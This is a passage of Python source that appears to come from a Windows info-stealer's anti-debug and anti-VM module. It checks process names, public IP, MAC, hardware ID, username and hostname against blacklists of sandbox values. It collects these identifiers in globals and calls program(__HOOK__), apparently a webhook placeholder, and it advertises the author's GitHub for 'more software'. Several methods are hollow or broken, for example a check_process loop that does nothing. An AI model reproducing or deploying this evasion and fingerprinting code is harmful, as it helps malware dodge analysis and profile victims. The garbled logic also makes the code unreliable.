            debugging = False
        if self.get_system():
            debugging = False

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def get_network(self) -> bool:
        global ip, mac, github

        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        github = "https://github.com/Purora (FOR MORE SOFTWARE)"

        if ip in self.blackListedIPS:
            return False
        if mac in self.blackListedMacs:
            return False

    def get_system(self) -> bool:
        global hwid, username, hostname

        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        if hwid in self.blackListedHWIDS:
            return False
        if username in self.blackListedUsers:
            return False
        if hostname in self.blackListedPCNames:
            return False
    def self_destruct(self) -> None:
        program(__HOOK__)

if __name__ == '__main__' and os.name == "nt":
        program(__HOOK__)
